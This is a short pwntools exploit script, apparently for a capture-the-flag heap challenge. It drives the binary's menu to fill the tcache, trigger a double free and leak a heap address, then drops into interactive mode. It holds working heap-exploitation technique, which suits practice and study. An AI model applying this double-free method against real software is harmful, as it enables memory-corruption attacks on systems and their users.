#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r

r = conn()

def sl(a,b):
    r.sendlineafter(a,b)

def s(a,b):
    r.sendafter(a,b)

def alloc(size, data):
    sl(">> ", "1")
    sl(" : ", str(size))
    s(" : ", data)

def free(index, offset):
    sl(">> ", "2")
    sl("Enter index: ", str(index))
    sl("Which one?(1337 for all) ", str(offset))

def link(index0, index1):
    sl(">> ", "3")
    sl("index: ", str(index0))
    sl("index: ", str(index1))

def unlink(index, offset, keep):
    sl(">> ", "4")
    sl("index: ", str(index))
    sl("offset: ", str(offset))
    sl("Do you want to keep it (y/n)? ", keep)

def main():
    
    # link <-
    alloc(0x40, b"1"*0x40) 
    alloc(0x40, b"2"*0x40) 
    alloc(0x40, b"3"*0x40) 
    alloc(0x40, b"4"*0x40) 

    alloc(0x40, b"5"*0x40)
    alloc(0x40, b"6"*0x40)
    alloc(0x40, b"7"*0x40)
    alloc(0x40, b"8"*0x40)
    alloc(0x40, b"9"*0x40)
    alloc(0x40, b"A"*0x40)
    
    link(0, 1)
    link(0, 2)

    unlink(0, 2, "y")
    
    free(3, 1)
    free(4, 1)
    free(5, 1)
    free(6, 1)
    free(7, 1)
    free(8, 1)
    free(9, 1)

    free(0, 2)
    
    
    alloc(0x40, "B"*0x40)
    alloc(0x40, "C"*0x40)
    
    # Double free
    free(1, 1337)
    
    # This chunk2 is our double freed
    alloc(0x40, b"M")
    
    for i in range(3):
        alloc(0x18, str(i))
    
    # This chunk data is our chunk2.
    alloc(0x18, p64(0)*2 + b"M")
    
    sl(">> ", "2")
    sl(": ", "1")
    r.recvuntil("Node 1 Offset 1 : ")
    heap_leak = u64(r.recv(6).ljust(8, p8(0)))
    log.warn("Heap leak @ 0x%x", heap_leak)
    sl(") ", "1337")

    r.interactive()


if __name__ == "__main__":
    main()
